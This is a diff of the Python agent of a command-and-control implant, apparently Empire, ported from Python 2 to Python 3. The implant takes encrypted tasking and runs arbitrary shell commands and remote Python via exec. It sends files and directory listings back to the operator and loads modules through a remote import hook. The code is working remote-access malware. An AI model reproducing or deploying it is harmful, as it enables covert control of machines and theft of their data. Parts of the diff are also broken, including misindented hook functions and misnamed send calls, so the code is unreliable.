@@ -1,14 +1,5 @@
-from __future__ import print_function
-from __future__ import division
-from future import standard_library
-standard_library.install_aliases()
-from builtins import str
-from builtins import range
-from builtins import object
-from past.utils import old_div
-import __future__
+import json
 import struct
-import time
 import base64
 import subprocess
 import random
@@ -16,15 +7,13 @@ import time
 import datetime
 import os
 import sys
-import trace
-import shlex
 import zlib
 import threading
 import http.server
 import zipfile
 import io
-import imp
-import marshal
+import importlib.util
+import types
 import re
 import shutil
 import pwd
@@ -32,7 +21,7 @@ import socket
 import math
 import stat
 import grp
-from stat import S_ISREG, ST_CTIME, ST_MODE
+import numbers
 from os.path import expanduser
 from io import StringIO
 from threading import Thread
@@ -145,17 +134,19 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-
     packetType = struct.pack('=H', taskingID)
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
     resultID = struct.pack('=H', resultID)
-    
+
     if packetData:
-        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
+        if(isinstance(packetData, str)):
+            packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
+        else:
+            packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
-            
+
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
@@ -187,17 +178,21 @@ def parse_task_packet(packet, offset=0):
 
     # print "parse_task_packet"
 
+    if(isinstance(packet, str)):
+        packet = packet.encode('UTF-8')
+
     try:
         packetType = struct.unpack('=H', packet[0+offset:2+offset])[0]
         totalPacket = struct.unpack('=H', packet[2+offset:4+offset])[0]
         packetNum = struct.unpack('=H', packet[4+offset:6+offset])[0]
         resultID = struct.unpack('=H', packet[6+offset:8+offset])[0]
         length = struct.unpack('=L', packet[8+offset:12+offset])[0]
-        packetData = packet[12+offset:12+offset+length]
-        remainingData = packet[12+offset+length:]
+        packetData = packet[12+offset:12+offset+length].decode('UTF-8')
+        remainingData = packet[12+offset+length:].decode('UTF-8')
+
         return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
     except Exception as e:
-        # print "parse_task_packet exception:",e
+        print("parse_task_packet exception:",e)
         return (None, None, None, None, None, None, None)
 
 
@@ -205,12 +200,12 @@ def process_tasking(data):
     # processes an encrypted data packet
     #   -decrypts/verifies the response to get
     #   -extracts the packets and processes each
-
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
+
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
-        
+
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
 
@@ -222,7 +217,6 @@ def process_tasking(data):
             resultPackets += result
 
         packetOffset = 12 + length
-
         while remainingData and remainingData != '':
             (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
             result = process_packet(packetType, data, resultID)
@@ -256,42 +250,41 @@ def process_job_tasking(result):
 
 def process_packet(packetType, data, resultID):
 
+    if(isinstance(data, bytes)):
+        data = data.decode('UTF-8')
     try:
         packetType = int(packetType)
     except Exception as e:
         return None
-
     if packetType == 1:
         # sysinfo request
         # get_sysinfo should be exposed from stager.py
-        return build_response_packet(1, get_sysinfo(), resultID)
+        send_message(build_response_packet(1, get_sysinfo(), resultID))
 
     elif packetType == 2:
         # agent exit
-
         send_message(build_response_packet(2, "", resultID))
         agent_exit()
 
     elif packetType == 40:
         # run a command
         parts = data.split(" ")
-        
         if len(parts) == 1:
             data = parts[0]
             resultData = str(run_command(data))
-            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
         else:
             cmd = parts[0]
             cmdargs = ' '.join(parts[1:len(parts)])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
-            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
 
     elif packetType == 41:
         # file download
         objPath = os.path.abspath(data)
         fileList = []
         if not os.path.exists(objPath):
-            return build_response_packet(40, "file does not exist or cannot be accessed", resultID)
+            send_message(build_response_packet(40, "file does not exist or cannot be accessed", resultID))
 
         if not os.path.isdir(objPath):
             fileList.append(objPath)
@@ -316,9 +309,9 @@ def process_packet(packetType, data, resultID):
                  start_crc32 = c.crc32_data(encodedPart)
                  comp_data = c.comp_data(encodedPart)
                  encodedPart = c.build_header(comp_data, start_crc32)
-                 encodedPart = base64.b64encode(encodedPart)
+                 encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
 
-                 partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
+                 partData = "%s|%s|%s|%s" %(partIndex, filePath, size, encodedPart)
                  if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
                      break
 
@@ -356,6 +349,30 @@ def process_packet(packetType, data, resultID):
         except Exception as e:
             sendec_datadMessage(build_response_packet(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)), resultID))
 
+    elif packetType == 43:
+        # directory list
+        cmdargs = data
+
+        path = '/'  # default to root
+        if cmdargs is not None and cmdargs is not '' and cmdargs is not '/':  # strip trailing slash for uniformity
+            path = cmdargs.rstrip('/')
+        if path[0] is not '/':  # always scan relative to root for uniformity
+            path = '/{0}'.format(path)
+        if not os.path.isdir(path):
+            send_message(build_response_packet(43, 'Directory {} not found.'.format(path), resultID))
+        items = []
+        with os.scandir(path) as it:
+            for entry in it:
+                items.append({'path': entry.path, 'name': entry.name, 'is_file': entry.is_file()})
+
+        result_data = json.dumps({
+            'directory_name': path if len(path) == 1 else path.split('/')[-1],
+            'directory_path': path,
+            'items': items
+        })
+
+        send_message(build_response_packet(43, result_data, resultID))
+
     elif packetType == 50:
         # return the currently running jobs
         msg = ""
@@ -365,7 +382,7 @@ def process_packet(packetType, data, resultID):
             msg = "Active jobs:\n"
             for x in range(len(jobs)):
                 msg += "\t%s" %(x)
-        return build_response_packet(50, msg, resultID)
+        send_message(build_response_packet(50, msg, resultID))
 
     elif packetType == 51:
         # stop and remove a specified job if it's running
@@ -391,10 +408,10 @@ def process_packet(packetType, data, resultID):
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
-            return build_response_packet(100, str(results), resultID)
+            send_message(build_response_packet(100, str(results), resultID))
         except Exception as e:
-            errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+           errorData = str(buffer.getvalue())
+           return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
 
     elif packetType == 101:
         # dynamic code execution, wait for output, save output
@@ -407,16 +424,17 @@ def process_packet(packetType, data, resultID):
             code_obj = compile(data, '<string>', 'exec')
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
+            results = buffer.getvalue().encode('latin-1')
             c = compress()
-            start_crc32 = c.crc32_data(buffer.getvalue())
-            comp_data = c.comp_data(buffer.getvalue())
+            start_crc32 = c.crc32_data(results)
+            comp_data = c.comp_data(results)
             encodedPart = c.build_header(comp_data, start_crc32)
-            encodedPart = base64.b64encode(encodedPart)
-            return build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart, resultID)
+            encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
+            send_message(build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart, resultID))
         except Exception as e:
             # Also return partial code that has been executed
-            errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+            errorData = buffer.getvalue()
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
@@ -440,16 +458,16 @@ def process_packet(packetType, data, resultID):
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
                 result += "\n\nError removing module file, please verify path: " + str(implantPath)
-            return build_response_packet(100, str(result), resultID)
+            send_message(build_response_packet(100, str(result), resultID))
         except Exception as e:
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
-                return build_response_packet(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath), resultID)
-            return build_response_packet(0, "error executing specified Python data: %s" %(e), resultID)
+                send_message(build_response_packet(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data: %s" %(e), resultID))
 
     elif packetType == 110:
         start_job(data)
-        return build_response_packet(110, "job %s started" %(len(jobs)-1), resultID)
+        send(build_response_packet(110, "job %s started" %(len(jobs)-1), resultID))
 
     elif packetType == 111:
         # TASK_CMD_JOB_SAVE
@@ -466,10 +484,10 @@ def process_packet(packetType, data, resultID):
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             result = str(buffer.getvalue())
-            return build_response_packet(121, result, resultID)
+            send_message(build_response_packet(121, result, resultID))
         except Exception as e:
             errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 122:
         #base64 decode and decompress the data
@@ -524,8 +542,17 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
 
     else:
-        return build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID)
+        send_message(build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID))
 
+def old_div(a, b):
+    """
+    Equivalent to ``a / b`` on Python 2 without ``from __future__ import
+    division``.
+    """
+    if isinstance(a, numbers.Integral) and isinstance(b, numbers.Integral):
+        return a // b
+    else:
+        return a / b
 
 ################################################
 #
@@ -541,7 +568,7 @@ _search_order = [('.py', False), ('/__init__.py', True)]
 class ZipImportError(ImportError):
     """Exception raised by zipimporter objects."""
 
-# _get_info() = takes the fullname, then subpackage name (if applicable), 
+# _get_info() = takes the fullname, then subpackage name (if applicable),
 # and searches for the respective module or package
 
 class CFinder(object):
@@ -592,7 +619,7 @@ class CFinder(object):
     def load_module(self, fullname):
         submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
         code = compile(source, fullpath, 'exec')
-        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
+        mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
         mod.__loader__ = self
         mod.__file__ = fullpath
         mod.__name__ = fullname
@@ -621,16 +648,16 @@ class CFinder(object):
         submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
         return compile(source, fullpath, 'exec')
 
-def install_hook(repoName):
-    if repoName not in _meta_cache:
-        finder = CFinder(repoName)
-        _meta_cache[repoName] = finder
-        sys.meta_path.append(finder)
+    def install_hook(repoName):
+        if repoName not in _meta_cache:
+            finder = CFinder(repoName)
+            _meta_cache[repoName] = finder
+            sys.meta_path.append(finder)
 
-def remove_hook(repoName):
-    if repoName in _meta_cache:
-        finder = _meta_cache.pop(repoName)
-        sys.meta_path.remove(finder)
+    def remove_hook(repoName):
+        if repoName in _meta_cache:
+            finder = _meta_cache.pop(repoName)
+            sys.meta_path.remove(finder)
 
 ################################################
 #
@@ -937,13 +964,14 @@ def directory_listing(path):
 
 # additional implementation methods
 def run_command(command, cmdargs=None):
-    
     if re.compile("(ls|dir)").match(command):
         if cmdargs == None or not os.path.exists(cmdargs):
             cmdargs = '.'
 
         return directory_listing(cmdargs)
-
+    if re.compile("cd").match(command):
+        os.chdir(cmdargs)
+        return str(os.getcwd())
     elif re.compile("pwd").match(command):
         return str(os.getcwd())
     elif re.compile("rm").match(command):
@@ -979,7 +1007,7 @@ def run_command(command, cmdargs=None):
             command = "{} {}".format(command,cmdargs)
         
         p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-        return p.communicate()[0].strip()
+        return p.communicate()[0].strip().decode('UTF-8')
 
 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
@@ -1053,7 +1081,7 @@ while(True):
             except Exception as e:
                 result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
                 process_job_tasking(result)
-            if data == defaultResponse:
+            if data.strip() == defaultResponse.strip():
                 missedCheckins = 0
             else:
                 decode_routing_packet(data)
